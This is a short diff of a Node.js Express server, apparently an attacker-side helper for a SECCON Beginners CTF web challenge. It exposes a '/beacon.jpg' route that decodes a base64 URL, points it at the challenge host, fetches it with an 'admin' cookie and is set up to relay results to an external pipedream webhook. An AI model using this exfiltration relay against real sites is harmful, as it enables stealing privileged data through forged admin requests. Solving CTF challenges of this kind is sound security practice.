@@ -10,7 +10,12 @@ const WEBHOOK_URL = 'https://eoa0a3qqgsiiqb4.m.pipedream.net';
 // base64でURLをパスとして渡す形式
 app.get('/beacon.jpg/:b64url', async (req, res) => {
   try {
-    const target = Buffer.from(req.params.b64url, 'base64').toString();
+    let target = Buffer.from(req.params.b64url, 'base64').toString();
+
+    // 127.0.0.1やlocalhostを外部アクセス可能なFQDNに置換
+    target = target
+      .replace('127.0.0.1:50000', 'memo4b.challenges.beginners.seccon.jp:50000')
+      .replace('localhost:50000', 'memo4b.challenges.beginners.seccon.jp:50000');
 
     const flagRes = await fetch(target, {
       headers: { cookie: 'user=admin' }
